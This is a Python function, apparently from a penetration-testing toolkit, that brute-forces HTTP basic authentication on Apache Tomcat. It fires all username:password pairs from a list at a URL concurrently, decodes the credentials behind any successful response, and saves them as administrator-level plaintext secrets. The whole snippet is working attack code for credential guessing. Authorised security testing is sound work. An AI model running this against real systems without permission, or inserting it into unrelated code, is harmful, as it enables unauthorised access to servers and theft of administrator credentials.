def brutefore_passwords(ip, url, credentials, service):
    """
        Bruteforce function, will try all the credentials at the same time, splits the given credentials at a ':'.
    """
    auth_requests = []
    for credential in credentials:
        split = credential.strip().split(':')
        username = split[0]
        password = ''
        if len(split) > 1:
            password = split[1]
        auth_requests.append(grequests.get(url, auth=(username, password)))
    results = grequests.map(auth_requests)
    for result in results:
        if result and result.status_code == 200:
            creds = result.request.headers['Authorization'].split(' ')[1]
            creds = base64.b64decode(creds).decode('utf-8')
            creds = creds.split(':')
            print_success("Found a password for tomcat: {0}:{1} at: {2}".format(
                creds[0], creds[1], url))
            credential = Credential(secret=creds[1], username=creds[0], type='plaintext', access_level='administrator', service_id=service.id, host_ip=ip, description='Tomcat')
            credential.save()